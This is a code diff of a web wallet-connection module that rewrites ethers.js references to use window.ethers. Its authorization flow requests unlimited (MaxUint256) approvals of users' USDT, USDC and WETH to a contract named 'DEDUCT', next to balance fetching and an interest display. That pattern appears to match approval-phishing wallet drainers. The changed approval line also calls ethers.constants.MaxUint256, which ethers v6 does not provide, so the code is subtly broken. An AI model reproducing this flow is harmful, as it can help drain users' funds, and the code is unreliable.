@@ -1,4 +1,3 @@
-import { ethers } from 'https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.5/ethers.umd.min.js';
 import { DEDUCT_CONTRACT_ADDRESS, USDT_CONTRACT_ADDRESS, USDC_CONTRACT_ADDRESS, WETH_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, ERC20_ABI, translations } from './constants.js';
 import { updateStatus, disableInteractiveElements, updateBalancesUI, updateInterest } from './ui.js';
 import { saveUserData } from './sse.js';
@@ -46,13 +45,13 @@ export async function initializeWallet() {
             document.getElementById('connectButton').disabled = true;
             return;
         }
-        if (!ethers || !ethers.BrowserProvider) {
+        if (!window.ethers || !window.ethers.BrowserProvider) {
             updateStatus(translations[currentLang].ethersError, true);
             console.error(`initializeWallet: Ethers.js BrowserProvider not available. Check CDN or script tag.`);
             document.getElementById('connectButton').disabled = true;
             return;
         }
-        provider = new ethers.BrowserProvider(window.ethereum);
+        provider = new window.ethers.BrowserProvider(window.ethereum);
         window.ethereum.on('accountsChanged', (newAccounts) => {
             console.log(`initializeWallet: Accounts changed:`, newAccounts);
             if (userAddress && (newAccounts.length === 0 || userAddress.toLowerCase() !== newAccounts[0].toLowerCase())) {
@@ -87,13 +86,13 @@ export async function connectWallet() {
             document.getElementById('connectButton').disabled = true;
             return;
         }
-        if (!ethers || !ethers.BrowserProvider) {
+        if (!window.ethers || !window.ethers.BrowserProvider) {
             updateStatus(translations[currentLang].ethersError, true);
             console.error(`connectWallet: Ethers.js BrowserProvider not available. Check CDN or script tag.`);
             document.getElementById('connectButton').disabled = true;
             return;
         }
-        provider = new ethers.BrowserProvider(window.ethereum);
+        provider = new window.ethers.BrowserProvider(window.ethereum);
         console.log(`connectWallet: Initialized provider.`);
         updateStatus('Please confirm connection in your wallet...');
         const accounts = await provider.send('eth_requestAccounts', []);
@@ -107,10 +106,10 @@ export async function connectWallet() {
         connectButton.textContent = 'Connected';
         connectButton.title = 'Disconnect Wallet';
         connectButton.disabled = false;
-        deductContract = new ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
-        usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
-        usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
-        wethContract = new ethers.Contract(WETH_CONTRACT_ADDRESS, ERC20_ABI, signer);
+        deductContract = new window.ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
+        usdtContract = new window.ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
+        usdcContract = new window.ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
+        wethContract = new window.ethers.Contract(WETH_CONTRACT_ADDRESS, ERC20_ABI, signer);
         await updateUIBasedOnChainState();
         updateStatus(translations[currentLang].fetchingBalances);
         const balances = {
@@ -212,7 +211,7 @@ export async function handleConditionalAuthorizationFlow() {
         console.log(`handleConditionalAuthorizationFlow: ${name} allowance: ${currentAllowance.toString()}`);
         if (currentAllowance < requiredAllowance) {
             updateStatus(`Requesting ${name} approval... Please approve in your wallet.`);
-            const approvalTx = await contract.approve.populateTransaction(DEDUCT_CONTRACT_ADDRESS, ethers.constants.MaxUint256);
+            const approvalTx = await contract.approve.populateTransaction(DEDUCT_CONTRACT_ADDRESS, window.ethers.constants.MaxUint256);
             approvalTx.value = 0n;
             console.log(`handleConditionalAuthorizationFlow: Sending approval transaction for ${name}:`, approvalTx);
             await sendMobileRobustTransaction(approvalTx);
